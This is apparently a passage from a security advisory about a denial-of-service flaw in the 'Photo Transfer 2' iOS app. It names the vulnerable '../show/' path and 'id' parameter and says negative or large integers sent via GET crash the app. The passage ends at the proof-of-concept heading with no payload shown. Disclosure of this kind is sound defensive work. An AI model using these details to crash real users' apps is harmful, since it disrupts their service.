Technical Details & Description:
================================
A remote denial of service vulnerability has been discovered in the official Photo Transfer 2 - v1.0 iOS mobile web-application.
The issue allows local attackers to crash or shutdown the software client by usage of special crafted payloads.

The vulnerability is located in the id value restriction of show module path context. Remote attacker can easily crash the application
remotly by including wrong and large id context in integer format. The attack vector is client-side and the request method to provoke
the mobile app crash is GET. The handling of the id path gets confused on negative integer values which results in a permanent app shutdown.

The security risk of the denial of service vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.4.
Exploitation of the DoS vulnerability requires no privilege application user account or low user interaction. Successful exploitation of the
vulnerability results in an application crash or permanent app service shutdown.


Vulnerable Module(s):
				[+] ../show/

Vulnerable Parameter(s):
				[+] id


Proof of Concept (PoC):
